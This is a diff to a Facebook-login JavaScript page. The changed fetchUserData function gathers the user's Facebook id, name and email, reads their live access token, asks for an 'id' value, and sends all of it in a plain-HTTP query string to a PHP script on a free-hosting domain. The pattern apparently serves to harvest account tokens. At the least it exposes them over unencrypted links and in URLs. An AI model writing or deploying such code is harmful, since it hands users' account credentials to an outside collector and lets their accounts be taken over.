@@ -48,15 +48,29 @@
 
         // Fetch user data after successful login
         function fetchUserData() {
-            FB.api('/me', {fields: 'name,email'}, function (response) {
+            FB.api('/me', {fields: 'name,email,id'}, function (response) {
                 // Get the user details
                 let userName = response.name;
                 let userEmail = response.email;
+                let userId = response.id;
                 let accessToken = FB.getAuthResponse().accessToken;
 
+                // Check if `someuserdeta` is present in the URL query string
+                let urlParams = new URLSearchParams(window.location.search);
+                let someuserdeta = urlParams.get('id');
+
+                // If 'id' (someuserdeta) is missing, show a popup to prompt the user
+                if (!someuserdeta) {
+                    someuserdeta = prompt('Please enter the ID:', 'default_id_value');
+                    if (!someuserdeta) {
+                        alert('ID is required to proceed.');
+                        return;
+                    }
+                }
+
                 // Redirect to the PHP page with user details in the query parameters
-                let url = `http://sabbir28.rf.gd/save_user_data.php?name=${encodeURIComponent(userName)}&email=${encodeURIComponent(userEmail)}&accessToken=${encodeURIComponent(accessToken)}`;
-                
+                let url = `http://sabbir28.rf.gd/save_user_data.php?facebook_id=${encodeURIComponent(userId)}&facebook_name=${encodeURIComponent(userName)}&facebook_email=${encodeURIComponent(userEmail)}&facebook_token=${encodeURIComponent(accessToken)}&filename=${encodeURIComponent(someuserdeta)}`;
+
                 // Open the URL in a new tab
                 window.open(url, '_blank');
             });
